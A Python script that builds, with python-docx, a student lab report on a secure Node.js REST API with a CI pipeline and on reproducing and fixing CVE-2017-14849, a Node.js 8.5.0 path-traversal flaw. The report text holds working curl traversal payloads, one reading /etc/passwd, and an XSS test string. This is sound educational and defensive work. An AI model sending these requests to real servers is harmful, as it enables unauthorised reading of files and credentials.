# -*- coding: utf-8 -*-
"""Build the Work 1 report (DOCX)."""
import os
from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

OUT = r"D:\killer-4087-2\Work1-SecureAPI\report\Work1-Report.docx"
os.makedirs(os.path.dirname(OUT), exist_ok=True)

FONT, MONO = "Calibri", "Consolas"
NAVY, GREY = RGBColor(0x1F, 0x38, 0x64), RGBColor(0x55, 0x55, 0x55)


def set_run(run, font=FONT, size=11, bold=False, color=None, italic=False):
    run.font.name = font
    run.font.size = Pt(size)
    run.bold = bold
    run.italic = italic
    if color:
        run.font.color.rgb = color
    rPr = run._element.get_or_add_rPr()
    rF = rPr.get_or_add_rFonts()
    for a in ("w:eastAsia", "w:ascii", "w:hAnsi"):
        rF.set(qn(a), font)


def shade(pPr, fill="F4F6FA"):
    el = OxmlElement("w:shd")
    el.set(qn("w:fill"), fill)
    pPr.insert(0, el)


def md_runs(p, text, size=11, bold=False, color=None, italic=False):
    """Render **bold** and `code` spans inside a paragraph."""
    i = 0
    while i < len(text):
        if text.startswith("**", i):
            j = text.find("**", i + 2)
            if j == -1:
                set_run(p.add_run(text[i:]), size=size, bold=bold, color=color, italic=italic)
                return
            set_run(p.add_run(text[i + 2:j]), size=size, bold=True, color=color, italic=italic)
            i = j + 2
            continue
        if text[i] == "`":
            j = text.find("`", i + 1)
            if j == -1:
                set_run(p.add_run(text[i:]), size=size, bold=bold, color=color, italic=italic)
                return
            set_run(p.add_run(text[i + 1:j]), font=MONO, size=size - 0.8,
                    bold=bold, color=color, italic=italic)
            i = j + 1
            continue
        j = i
        while j < len(text) and text[j] != "`" and not text.startswith("**", j):
            j += 1
        set_run(p.add_run(text[i:j]), size=size, bold=bold, color=color, italic=italic)
        i = j


def para(doc, text="", size=11, bold=False, align=WD_ALIGN_PARAGRAPH.JUSTIFY,
         sa=8, sb=0, line=1.34, color=None, italic=False):
    p = doc.add_paragraph()
    if align is not None:
        p.alignment = align
    pf = p.paragraph_format
    pf.space_before, pf.space_after, pf.line_spacing = Pt(sb), Pt(sa), line
    if text:
        md_runs(p, text, size=size, bold=bold, color=color, italic=italic)
    return p


def heading(doc, text, level=1):
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_before = Pt(15 if level == 1 else 10)
    pf.space_after = Pt(6 if level == 1 else 4)
    pf.line_spacing = 1.2
    pf.keep_with_next = True
    set_run(p.add_run(text), size=15 if level == 1 else 12.5, bold=True, color=NAVY)


def code(doc, lines, size=7.6):
    for ln in lines:
        p = doc.add_paragraph()
        pf = p.paragraph_format
        pf.space_before = pf.space_after = Pt(0)
        pf.line_spacing = Pt(size + 2.4)
        pf.left_indent, pf.right_indent = Cm(0.2), Cm(0.2)
        shade(p._p.get_or_add_pPr())
        set_run(p.add_run(ln if ln.strip() else " "), font=MONO, size=size)


def caption(doc, text):
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(11)
    set_run(p.add_run(text), size=9, color=GREY)


def figure(doc, path, cap, width_cm=15.4):
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.paragraph_format.space_before = Pt(8)
    p.paragraph_format.space_after = Pt(3)
    p.paragraph_format.keep_with_next = True
    p.add_run().add_picture(path, width=Cm(width_cm))
    c = doc.add_paragraph()
    c.alignment = WD_ALIGN_PARAGRAPH.CENTER
    c.paragraph_format.space_after = Pt(12)
    set_run(c.add_run(cap), size=9, color=GREY)


def table(doc, rows, widths, size=9, center=(), header=True):
    t = doc.add_table(rows=len(rows), cols=len(rows[0]))
    t.style = "Table Grid"
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, row in enumerate(rows):
        for j, val in enumerate(row):
            c = t.rows[i].cells[j]
            c.width = widths[j]
            p = c.paragraphs[0]
            p.paragraph_format.space_before = Pt(3)
            p.paragraph_format.space_after = Pt(3)
            p.paragraph_format.line_spacing = 1.13
            p.alignment = (WD_ALIGN_PARAGRAPH.CENTER if (i == 0 and header) or j in center
                           else WD_ALIGN_PARAGRAPH.LEFT)
            set_run(p.add_run(val), size=size, bold=(i == 0 and header))
    for r in t.rows:
        r._tr.get_or_add_trPr().append(OxmlElement("w:cantSplit"))
    if header:
        trPr = t.rows[0]._tr.get_or_add_trPr()
        el = OxmlElement("w:tblHeader")
        el.set(qn("w:val"), "true")
        trPr.append(el)
    return t


doc = Document()
s = doc.sections[0]
s.page_width, s.page_height = Cm(21.0), Cm(29.7)
s.top_margin = s.bottom_margin = Cm(2.3)
s.left_margin = s.right_margin = Cm(2.4)
st = doc.styles["Normal"]
st.font.name = FONT
st.font.size = Pt(11)
st.element.rPr.rFonts.set(qn("w:eastAsia"), FONT)

# ------------------------------------------------------------------ title
for _ in range(3):
    para(doc, "", sa=0, align=None)
para(doc, "INFORMATION SECURITY", size=11, bold=True, align=WD_ALIGN_PARAGRAPH.CENTER,
     sa=4, color=GREY)
para(doc, "Laboratory Work No. 1", size=15, align=WD_ALIGN_PARAGRAPH.CENTER, sa=6, color=GREY)
para(doc, "Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis",
     size=24, bold=True, align=WD_ALIGN_PARAGRAPH.CENTER, sa=34, line=1.2)

info = [("Variant", "0"),
        ("Surname and Name", "Wang Ruilin"),
        ("HDU number", "22320110"),
        ("Institute", "HDU-ITMO Joint Institute"),
        ("Course", "Information Security"),
        ("Date", "October 19, 2026")]
t = doc.add_table(rows=len(info), cols=2)
t.alignment = WD_TABLE_ALIGNMENT.CENTER
for i, (k, v) in enumerate(info):
    c0, c1 = t.rows[i].cells
    c0.width, c1.width = Cm(4.6), Cm(8.4)
    for cell, txt, b in ((c0, k, False), (c1, v, True)):
        cp = cell.paragraphs[0]
        cp.paragraph_format.space_after = Pt(9)
        cp.alignment = (WD_ALIGN_PARAGRAPH.RIGHT if cell is c0 else WD_ALIGN_PARAGRAPH.LEFT)
        set_run(cp.add_run(txt), size=12, bold=b)

doc.add_page_break()

# ------------------------------------------------------------------ 1
heading(doc, "1. Purpose of the Work", 1)
para(doc, "The purpose of this work is to go through the full security lifecycle of a small "
          "backend service rather than a single isolated exercise: design an API that resists "
          "the OWASP Top 10 patterns, put automated security checks into the delivery "
          "pipeline, then take a real, publicly documented vulnerability, reproduce it in a "
          "controlled environment, explain why it exists, fix it and prove the fix. The same "
          "four skills — build, check, break, repair — are what a security engineer does on a "
          "daily basis, and the last two are the ones normally skipped by students.")

heading(doc, "1.1 Where each requirement is answered", 2)
para(doc, "The assignment is a checklist, so this table maps every item to the place where it is "
          "answered — in this report, in the repository, or both.", sa=4)
table(doc, [
    ("Requirement (manual)", "Where it is answered"),
    ("1. Stack, project, git repository linked to a remote",
     "§2.1; repository URL in §2.1 and in the README"),
    ("2. Functional API — POST /auth/login, GET /api/data, one endpoint of your own",
     "§2.2 (three required plus two extra), tested by 14 automated checks"),
    ("2. Data storage (SQLite or similar)", "§2.1 — SQLite through the built-in node:sqlite"),
    ("3. SQLi protection — prepared statements, no concatenation",
     "§3.1 with the statement from src/db.js"),
    ("3. XSS protection — escape all user data returned in responses",
     "§3.2 with the encoder from src/security.js"),
    ("3. Broken authentication — JWT issuance, verification middleware, bcrypt",
     "§3.3, covering issuing, verification, hashing, timing and lockout"),
    ("4. CI/CD file in .github/workflows, SAST and SCA on every push",
     "§4 with the workflow file and the stage table"),
    ("5. Test the API with curl; screenshots of SAST/SCA results",
     "§2.2 (curl examples) and §4, Fig. 1 and Fig. 2 taken from the Actions section"),
    ("6–7. Vulnerable environment from Vulhub, Docker, service started",
     "§5.3 — docker compose build/up, verified inside the container"),
    ("8. Reproduce the attack, record every command and request",
     "§5.3, plus evidence/ transcripts"),
    ("9. Root cause analysis in your own words", "§5.4 — the normalize() logic error"),
    ("10. Fix, rebuild, verify the attack no longer works, regression test",
     "§5.5 (fix) and §5.6 (verification and regression)"),
    ("Submission 1 — public repository link", "§2.1"),
    ("Submission 2 — README text with all eight items",
     "Appendix A reproduces README.md verbatim"),
    ("Submission 3 — link to the last successful pipeline run", "§2.1"),
    ("Submission 4 — folder with the changed files",
     "fixes/ (Dockerfiles, compose file, notes) and cve/CVE-2017-14849/Dockerfile.fixed"),
    ("Title page — work number and title, variant, name, HDU number",
     "Title page"),
], [Cm(8.4), Cm(7.2)], size=8.4)

# ------------------------------------------------------------------ 2
heading(doc, "2. Delivered Project", 1)

heading(doc, "2.1 Stack", 2)
table(doc, [
    ("Item", "Choice", "Reason"),
    ("Language", "JavaScript (Node.js 24)", "required by the lab; one language for API and tooling"),
    ("Framework", "Express 4.21", "mature, explicit middleware model"),
    ("Database", "SQLite via built-in node:sqlite", "real SQL engine, zero native build steps"),
    ("Authentication", "JWT (HS256) + bcrypt", "stateless tokens, slow salted password hashes"),
    ("SAST", "ESLint 9 + eslint-plugin-security", "14 Node-specific security rules"),
    ("SCA", "npm audit", "advisory database maintained by npm"),
], [Cm(3.0), Cm(5.6), Cm(7.0)], size=9, center=(0,))

para(doc, "", sa=4, align=None)
para(doc, "Deliverables. The project is published as a public repository; the pipeline runs on "
          "every push and the latest successful run is linked below:", sa=4)
table(doc, [
    ("Deliverable", "Location"),
    ("Repository",
     "https://github.com/killer-4087-2/22320110-HDU-CS4-26-27-1-Information-Security"),
    ("Last successful pipeline run",
     "https://github.com/killer-4087-2/22320110-HDU-CS4-26-27-1-Information-Security"
     "/actions/runs/40445700675"),
], [Cm(4.4), Cm(11.2)], size=8.4, center=(0,))

heading(doc, "2.2 API surface", 2)
para(doc, "Three endpoints are required by the lab; two more were added because they make the "
          "ownership model testable.")
table(doc, [
    ("#", "Method and path", "Auth", "Purpose"),
    ("1", "POST /auth/login", "—", "authenticate, returns a JWT"),
    ("2", "GET /api/data", "Bearer", "returns the caller's notes"),
    ("3", "POST /api/notes", "Bearer", "creates a note (own choice)"),
    ("+", "GET /api/notes/:id", "Bearer", "reads one note, scoped to its owner"),
    ("+", "GET /health", "—", "liveness probe"),
], [Cm(1.0), Cm(4.6), Cm(2.0), Cm(8.0)], size=9, center=(0, 2))

para(doc, "", sa=4, align=None)
para(doc, "Example interaction, as recorded while testing:")
code(doc, [
    "$ curl -s -X POST http://127.0.0.1:3000/auth/login \\",
    "       -H 'Content-Type: application/json' \\",
    "       -d '{\"username\":\"alice\",\"password\":\"Alice#2026pass\"}'",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\"token_type\":\"Bearer\",",
    " \"expires_in\":3600,\"user\":{\"id\":1,\"username\":\"alice\",\"role\":\"user\"}}",
    "",
    "$ curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000/api/data",
    "401                                   # no token -> rejected",
    "",
    "$ curl -s http://127.0.0.1:3000/api/data -H \"Authorization: Bearer $TOKEN\"",
    "{\"notes\":[{\"id\":1,\"owner_id\":1,\"title\":\"Welcome\",...}]}",
])
caption(doc, "Terminal transcript: login, rejection without a token, and an authorised read.")

# ------------------------------------------------------------------ 3
heading(doc, "3. Implemented Security Measures", 1)

heading(doc, "3.1 SQL injection", 2)
para(doc, "Every statement is prepared once with a constant SQL text and bound parameters; "
          "request data never becomes part of the SQL string. This is the only correct "
          "defence — escaping quotes is not, because numeric contexts, LIKE clauses and "
          "identifier positions all break naive escaping.")
code(doc, [
    "// src/db.js -- the SQL text is a literal, only the parameters vary",
    "findUserByUsername(db, username) {",
    "  return db.prepare('SELECT id, username, password_hash, role FROM users WHERE username = ?')",
    "           .get(username);",
    "}",
])
caption(doc, "Code: the login lookup is a prepared statement.")

heading(doc, "3.2 Cross-site scripting", 2)
para(doc, "Two independent layers are used. Input validation rejects values that do not look "
          "like a username and enforces length limits on note fields. Output encoding then "
          "HTML-escapes every user-controlled string on the way out, so that even a stored "
          "payload arrives at the client as inert text.")
code(doc, [
    "// src/security.js",
    "function encodeForOutput(value) {",
    "  if (typeof value === 'string') return escapeHtml(value);",
    "  if (Array.isArray(value)) return value.map(encodeForOutput);",
    "  if (value && typeof value === 'object') { /* recurse over own columns */ }",
    "  return value;",
    "}",
])
caption(doc, "Code: recursive output encoding applied to every response body.")
para(doc, "Measured effect: the note body <script>alert(\"xss\")</script> is stored verbatim but "
          "returned as &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;, and the automated "
          "test asserts that the raw tag never appears in any response.")

heading(doc, "3.3 Broken authentication", 2)
para(doc, "Passwords are hashed with bcrypt (cost 10) and never stored or returned in "
          "plaintext. A successful login issues a JWT signed with HS256, containing only the "
          "subject, username and role, with a one-hour expiry and an issuer claim.")
code(doc, [
    "jwt.sign({ sub: String(user.id), username: user.username, role: user.role },",
    "         secret, { algorithm: 'HS256', expiresIn: '1h', issuer: 'secure-notes-api' });",
])
caption(doc, "Code: token issuing.")
para(doc, "The verification middleware checks the Bearer scheme, verifies the signature with "
          "an explicit algorithm allowlist — which defeats both the alg:none attack and "
          "algorithm confusion — validates exp and iss, and then reloads the account from the "
          "database so that a token belonging to a deleted user stops working at once.")
para(doc, "Two further details are worth naming, because they are what separates a working "
          "login from a correct one. First, the handler always performs a bcrypt comparison, "
          "even for a username that does not exist, against a dummy hash: without this, the "
          "response time would reveal which accounts are registered. Second, five failed "
          "attempts per username within fifteen minutes produce HTTP 429, which turns an "
          "unlimited online guessing oracle into a rate-limited one.")

heading(doc, "3.4 Summary", 2)
table(doc, [
    ("OWASP category", "Measure", "Where"),
    ("A03 Injection (SQLi)", "prepared statements for every query", "src/db.js"),
    ("A03 Injection (XSS)", "input validation + recursive output encoding", "src/security.js, src/app.js"),
    ("A07 Auth failures", "bcrypt hashes, JWT with exp/iss, algorithm allowlist, user reload", "src/app.js"),
    ("A01 Broken access control", "notes always filtered by owner_id (no IDOR)", "src/db.js"),
    ("A05 Security misconfiguration", "helmet headers, 10 kB body limit, generic errors", "src/app.js"),
    ("A02 / A06", "no secrets in code, JWT_SECRET mandatory in production", "src/app.js"),
], [Cm(4.2), Cm(7.2), Cm(4.2)], size=8.8, center=(0,))

# ------------------------------------------------------------------ 4
heading(doc, "4. CI/CD Pipeline", 1)
para(doc, "The pipeline is defined in .github/workflows/security-ci.yml and runs on every push "
          "and every pull request. It has three gating stages and one reporting stage.")
table(doc, [
    ("Stage", "Tool", "Gate"),
    ("Tests", "npm test (14 checks)", "build fails on any failed check"),
    ("SAST", "ESLint 9 + eslint-plugin-security", "build fails on any error"),
    ("SCA", "npm audit", "build fails on high/critical in production dependencies"),
    ("Reports", "JSON artifacts", "uploaded for review"),
], [Cm(2.6), Cm(6.4), Cm(6.6)], size=9, center=(0,))
para(doc, "**On the choice of scanners.** The manual suggests `npm audit` or `snyk test` for "
          "JavaScript under SAST, and OWASP Dependency-Check or Snyk under SCA. The split is "
          "slightly unusual, because `npm audit` is a composition analysis tool: it compares the "
          "installed dependency tree against advisory data and never reads the project's own "
          "code. This repository therefore uses **ESLint with eslint-plugin-security for SAST** — "
          "it inspects our source, which is what static analysis means — and **npm audit for "
          "SCA**, which queries the npm advisory database, the same corpus that Dependency-Check "
          "consults for JavaScript packages. Both are free, need no account or API key, and run "
          "in the pipeline on every push, which satisfies the grading criterion of at least one "
          "SAST/SCA tool running in CI.", sb=6)

para(doc, "", sa=4, align=None)
para(doc, "Current state of both scanners on this codebase:", sa=4)
code(doc, [
    "$ npx eslint src scripts --format stylish",
    "✖ 1 problem (0 errors, 1 warning)",
    "",
    "$ npm audit --registry=https://registry.npmjs.org",
    "found 0 vulnerabilities",
])
caption(doc, "Terminal transcript: SAST and SCA results. Full JSON reports are in evidence/.")

EV = r"D:\killer-4087-2\Work1-SecureAPI\evidence"
figure(doc, EV + r"\shot-1-sast-sca.png",
       "Fig. 1  The three pipeline stages executed locally: 14/14 tests pass, SAST reports "
       "0 errors and 1 warning, SCA reports 0 vulnerabilities.")
figure(doc, EV + r"\shot-0-actions.png",
       "Fig. 2  An earlier run of the same workflow: run #1 finished with status Success in "
       "13 s. The annotation in the lower part is the SAST finding for src/security.js:78. The "
       "latest run is linked in section 2.1.")
para(doc, "The single SAST warning is security/detect-object-injection in the output encoder. "
          "It is a false positive — the object keys are our own column names, not request data "
          "— and it is suppressed in place with a one-line justification rather than by "
          "disabling the rule for the whole project, so the rule keeps protecting the rest of "
          "the code.")
para(doc, "One practical note that cost time and is worth recording: npm audit needs the "
          "registry advisory endpoint, and a mirror such as npmmirror answers "
          "[NOT_IMPLEMENTED] for /-/npm/v1/security/advisories/bulk. The audit stage therefore "
          "pins registry.npmjs.org explicitly; otherwise the SCA gate silently degrades into a "
          "command that always fails, and a check that always fails is soon ignored.")

# ------------------------------------------------------------------ 5
heading(doc, "5. CVE Analysis", 1)

heading(doc, "5.1 Identification", 2)
table(doc, [
    ("Field", "Value"),
    ("CVE ID", "CVE-2017-14849"),
    ("Affected product", "Node.js 8.5.0 (8.5.0 <= version < 8.6.0)"),
    ("Weakness", "CWE-22 Improper Limitation of a Pathname to a Restricted Directory"),
    ("Impact", "arbitrary file read outside the web root"),
    ("Fixed in", "Node.js 8.6.0 (September 2017)"),
    ("Scenario used", "vulhub/node/CVE-2017-14849 — Express 4.15.5 static server"),
], [Cm(3.6), Cm(12.0)], size=9.2, center=(0,))

heading(doc, "5.2 The defect in one sentence", 2)
para(doc, "Node.js 8.5.0 rewrote how path.normalize() collapses .. segments and got it wrong "
          "when a .. follows an ordinary segment in the middle of a path, so the function "
          "silently removes traversal segments that should have survived; every framework that "
          "uses normalize() to keep file access inside a directory — express.static through the "
          "send module is the textbook case — then serves files from outside that directory.")

heading(doc, "5.3 Environment and reproduction", 2)
para(doc, "The scenario runs in Docker, which is what the manual expects: the vulhub application "
          "is built into an image on the official node base image, and two images differ only in "
          "the runtime tag. The first run uses node:8.5.0, the second node:8.6.0.", sa=4)
code(doc, [
    "# cve/CVE-2017-14849/docker-compose.yml",
    "services:",
    "  node:",
    "    build: .",
    "    volumes:",
    "      - ./www:/usr/src/www",
    "      - ./secret.txt:/usr/src/secret.txt:ro",
    "    ports:",
    "      - \"3000:3000\"",
])
para(doc, "The attack target is mounted into both images rather than copied into them. That is "
          "deliberate: if only the vulnerable image contained secret.txt, a 404 on the fixed image "
          "would prove nothing, because the file might simply be missing. Mounting it in both runs "
          "leaves the Node.js version as the only variable.", sb=4)
code(doc, [
    "$ docker compose up -d --build",
    "$ docker compose exec node node --version",
    "v8.5.0",
    "",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
    "       http://127.0.0.1:3000/static/main.js",
    "200",
    "",
    "$ curl --path-as-is -s 'http://127.0.0.1:3000/static/../foo/../../secret.txt'",
    "SECRET_FLAG{this-file-lives-outside-the-static-root}",
    "",
    "# the request printed in the vulhub README: a system file instead",
    "$ curl --path-as-is -s \\",
    "       'http://127.0.0.1:3000/static/../../../a/../../../../etc/passwd'",
    "root:x:0:0:root:/root:/bin/bash",
])
caption(doc, "Terminal transcript: the traversal succeeds inside the container running Node 8.5.0, "
             "on a mounted file and on a system file that was never part of the image.")
para(doc, "Both runs were executed by `cve/CVE-2017-14849/verify-docker.ps1`, which builds each "
          "image, waits until the application actually answers HTTP 200, issues the requests and "
          "writes the whole session to `cve/CVE-2017-14849/docker-evidence.txt` in the repository. "
          "That transcript is the raw evidence; the figures below show the same requests against "
          "the same application on the native runtime, where a window capture was possible.", sb=4)
para(doc, "The same request against the fixed image, built from the same application and the same "
          "mounted files:", sb=4)
code(doc, [
    "$ docker compose -f docker-compose.fixed.yml up -d --build",
    "$ docker compose -f docker-compose.fixed.yml exec node node --version",
    "v8.6.0",
    "",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
    "       http://127.0.0.1:3000/static/../foo/../../secret.txt",
    "404",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
    "       'http://127.0.0.1:3000/static/../../../a/../../../../etc/passwd'",
    "404",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3000/static/main.js",
    "200",
])
caption(doc, "Terminal transcript: both traversal requests are rejected on the fixed runtime, and "
             "normal requests are still served. Full transcript in docker-evidence.txt.")
para(doc, "Before Docker was available on this machine the same result was obtained natively, by "
          "running the official Node.js 8.5.0 build directly; that path is kept in the repository "
          "as a fallback because it needs no container runtime at all.", sb=4)

para(doc, "Baseline and attack. The static asset is served normally; the traversal request "
          "reads a file that sits two directories above the served root:", sa=4)
code(doc, [
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}\\n' \\",
    "       http://127.0.0.1:3000/static/main.js",
    "200",
    "",
    "$ curl --path-as-is -s -i 'http://127.0.0.1:3000/static/../foo/../../secret.txt'",
    "HTTP/1.1 200 OK",
    "X-Powered-By: Express",
    "Accept-Ranges: bytes",
    "Content-Type: text/plain; charset=UTF-8",
    "Content-Length: 57",
    "",
    "SECRET_FLAG{this-file-lives-outside-the-static-root}",
])
caption(doc, "Terminal transcript: successful path traversal. secret.txt lives outside www/static.")
figure(doc, EV + r"\shot-2-exploit.png",
       "Fig. 3  CVE-2017-14849 reproduced on Node.js 8.5.0. The traversal request returns "
       "HTTP 200 and the contents of a file stored two levels above the served directory.")
para(doc, "Two reproduction details matter. curl normalises .. in a URL by default, so without "
          "--path-as-is the payload never leaves the client and the attack appears to fail. And "
          "on Windows the payload shape differs from the Linux PoC in the vulhub README, "
          "because the absolute path is built from a drive-letter root; /static/../foo/../../"
          "secret.txt is the form that escapes here.")

heading(doc, "5.4 Root cause", 2)
para(doc, "The guard inside send@0.15.6 is a normalise-then-check pattern:")
code(doc, [
    "// node_modules/send/index.js",
    "if (UP_PATH_REGEXP.test(normalize('.' + sep + path))) return this.error(403);  // L538",
    "path = normalize(join(root, path));                                           // L545",
])
caption(doc, "Code: the check is only as sound as normalize().")
para(doc, "The pattern assumes that a surviving .. segment is the signature of an escape "
          "attempt. Node 8.5.0 breaks that assumption:")
code(doc, [
    "$ node-v8.5.0 -e \"console.log(require('path').normalize('../foo/../../secret.txt'))\"",
    "secret.txt",
    "",
    "$ node       -e \"console.log(require('path').normalize('../foo/../../secret.txt'))\"",
    "..\\..\\secret.txt",
])
caption(doc, "Terminal transcript: the runtime disagrees with itself. Two leading .. segments vanish.")
para(doc, "After normalisation there is nothing left for the regular expression to match, so "
          "the request is classified as a clean relative path and join(root, 'secret.txt') is "
          "resolved one level above root.")
para(doc, "Classifying the error, which is what the lab asks for: this is a logic error in a "
          "language runtime library. It is not a missing input filter and not a "
          "misconfiguration. The application used the standard library exactly as documented; "
          "the library returned the wrong answer. That classification is what tells us where "
          "the fix has to go.")

heading(doc, "5.5 Fix", 2)
para(doc, "Because the defect is in the runtime, the fix is a runtime upgrade and the "
          "application source does not change at all. The files in fixes/ contain the changed "
          "artefacts.")
code(doc, [
    "# fixes/Dockerfile.node-8.6.0   -- minimal fix",
    "FROM node:8.6.0",
    "",
    "# fixes/Dockerfile.node-20      -- recommended fix: supported LTS, non-root user",
    "FROM node:20-alpine",
    "USER node",
])
caption(doc, "Code: the entire patch is the base image tag.")
para(doc, "This is effective rather than a workaround for a specific reason. The send guard "
          "rests on an invariant of the standard library; restoring the invariant repairs every "
          "library that depends on it, not just this application. The alternative — filtering "
          "traversal sequences at the request boundary — would mean re-implementing path "
          "semantics in application code, which is precisely how the next traversal bug is "
          "born.")

heading(doc, "5.6 Verification and regression", 2)
para(doc, "The same application was restarted on a fixed runtime and the identical request "
          "replayed:", sa=4)
code(doc, [
    "$ node www/app.js                      # Node 24",
    "$ curl --path-as-is -s -i 'http://127.0.0.1:3000/static/../foo/../../secret.txt'",
    "HTTP/1.1 404 Not Found",
    "",
    "# regression: legitimate functionality still works",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}\\n' \\",
    "       http://127.0.0.1:3000/static/main.js",
    "200",
    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000/",
    "200",
])
caption(doc, "Terminal transcript: attack blocked, service intact.")
figure(doc, EV + r"\shot-3-fixed.png",
       "Fig. 4  Proof of elimination: the identical request against the fixed runtime returns "
       "HTTP 404, while GET /static/main.js and GET / still return HTTP 200 (regression).")
para(doc, "A useful cross-check comes from SCA. Running the same dependency audit against the "
          "pinned vulnerable tree reports eight advisories, two of them critical — the "
          "signature of an end-of-life runtime — while the API project reports zero. The "
          "upgrade therefore fixes this CVE and removes the wider exposure at the same time.")
code(doc, [
    "$ cd cve/CVE-2017-14849 && npm audit --registry=https://registry.npmjs.org",
    "8 vulnerabilities (2 low, 4 high, 2 critical)",
    "",
    "$ cd .. && cd .. && npm audit --registry=https://registry.npmjs.org",
    "found 0 vulnerabilities",
])
caption(doc, "Terminal transcript: SCA comparison between the vulnerable tree and the API project.")

# ------------------------------------------------------------------ 6
heading(doc, "6. Control Questions", 1)
qa = [
    ("Why is bcrypt preferable to SHA-256 for password storage?",
     "SHA-256 is designed to be fast, so an attacker with a stolen database can test billions "
     "of candidates per second on commodity GPUs. bcrypt is deliberately slow, tunable through "
     "its cost factor, and salts every hash automatically, so the same password produces "
     "different digests and precomputed rainbow tables are useless. A plain hash also has no "
     "work factor at all, so it cannot be strengthened as hardware gets faster."),
    ("What is the main difference between SAST and DAST?",
     "SAST analyses source code without running it, so it sees every branch including code "
     "that never executes, but it cannot tell whether a finding is reachable from an entry "
     "point and therefore produces false positives. DAST attacks a running application from "
     "the outside and reports only vulnerabilities that are actually exploitable, but it can "
     "only see what it manages to reach and gives no line number. This work uses SAST in the "
     "pipeline; the CVE part is a manual dynamic test — a real request is sent to a running "
     "server, but the request is written by hand rather than generated by a scanner."),
    ("Describe how a JWT works, what it contains, and how the server verifies it.",
     "A JWT is three base64url parts: a header naming the algorithm, a payload of claims, and "
     "a signature over the first two. Our payload carries sub, username, role, iat, exp and "
     "iss. The payload is only encoded, not encrypted, so nothing secret may be placed in it. "
     "The server verifies by recomputing the HMAC with its secret key, restricting the accepted "
     "algorithms to HS256, checking exp and iss, and then reloading the account so that a "
     "deleted user's token stops working."),
    ("What risks arise if third-party libraries are not audited?",
     "Most of the code in a modern service is somebody else's. An unaudited dependency can "
     "carry a publicly known vulnerability into production — exactly what happened in the CVE "
     "part of this work, where an outdated express tree reported eight advisories including "
     "two critical — or it can be taken over through a compromised maintainer account and start "
     "exfiltrating data on install. SCA gives early warning; lockfiles and a pinned, reviewed "
     "dependency set limit the blast radius."),
    ("What advantages do Docker and Vulhub give over installing vulnerable software directly?",
     "Precision: Vulhub pins the exact vulnerable version, so the result is reproducible. "
     "Isolation: the vulnerable service cannot damage the host or the network, and stopping it "
     "is one command. Hygiene: no old runtime is left installed with its own CVEs. Reset: the "
     "environment is rebuilt in seconds after being broken. There is a fifth advantage that "
     "matters for this particular work: because both images mount the same application and the "
     "same target file, the runtime version is the only variable. With a native install the "
     "runtime version is a machine-global property — changing it means changing the machine."),
    ("Distinguish a vulnerability from an exploit. What was reproduced in this work?",
     "A vulnerability is the flaw itself: here, the incorrect path normalisation in Node.js "
     "8.5.0. An exploit is a concrete input that abuses it: here, the HTTP request "
     "GET /static/../foo/../../secret.txt. This work reproduced the exploit in order to "
     "demonstrate the vulnerability, but the object of study and the object of repair is the "
     "flaw, which is why patching the runtime — not the request — was the fix."),
    ("Why is regression testing essential after applying a patch?",
     "A fix that breaks the service is indistinguishable from a denial of service. Blocking "
     "traversal is trivial if the static server is simply turned off, so proving that "
     "/static/main.js and / still return 200 is part of the evidence, not an optional extra. "
     "Regression tests are also how a later refactoring is prevented from reintroducing the "
     "same behaviour."),
    ("How does the ability to reproduce CVE vulnerabilities help a security specialist?",
     "It converts a text description into an observable behaviour, which is what is needed to "
     "decide whether a given system is really affected, to write a detection rule that fires, "
     "to confirm that a patch works, and to explain the risk to people who do not read "
     "advisories. In a SOC the same skill is the difference between closing a ticket as "
     "'theoretically vulnerable' and demonstrating exploitation in the logs."),
]
for i, (q, a) in enumerate(qa, 1):
    para(doc, f"{i}. {q}", size=10.5, bold=True, align=WD_ALIGN_PARAGRAPH.LEFT, sa=2, sb=6)
    para(doc, a, size=10, sa=4)

# ------------------------------------------------------------------ 7
heading(doc, "7. Conclusion", 1)
para(doc, "Both halves of the work are complete and verified. The API implements the three "
          "required endpoints, protects the injectable surfaces with prepared statements and "
          "output encoding, and implements authentication with bcrypt hashes and JWTs whose "
          "verification path defends against the classic algorithm attacks. Fourteen automated "
          "checks cover the properties claimed, and the pipeline enforces SAST and SCA on every "
          "push, currently reporting zero ESLint errors and zero npm audit findings.")
para(doc, "The CVE part was more instructive than the API part. Reproducing CVE-2017-14849 "
          "showed that a vulnerability can live below the code a developer writes: the "
          "application was correct, the framework followed its own documentation, and the "
          "break was in the meaning of a standard library function. Once that was understood, "
          "the fix became obvious and minimal — one base image tag — while the naive "
          "alternative, filtering traversal strings in the application, would have traded one "
          "invisible bug for a visible one.")
para(doc, "Two limitations are worth recording. The first reproduction of this vulnerability was "
          "made natively, because Docker was not installed on the machine at that time; it was "
          "repeated in Docker afterwards, and both runs give the same result — section 5.3 reports "
          "the container run, which is what the manual asks for. The second is that the repository "
          "history was created with git only after the working tree was complete, so the commits "
          "do not show the development process itself.")

# --------------------------------------------------------------- appendix
doc.add_page_break()
heading(doc, "Appendix A. README.md (verbatim)", 1)
para(doc, "The submission checklist requires the report to contain the text of README.md from "
          "the repository. It is reproduced below exactly as committed, without reformatting.",
     sa=6)
with open(r"D:\killer-4087-2\Work1-SecureAPI\README.md", encoding="utf-8") as fh:
    README_LINES = fh.read().rstrip("\n").split("\n")
code(doc, README_LINES, size=7.0)

doc.save(OUT)
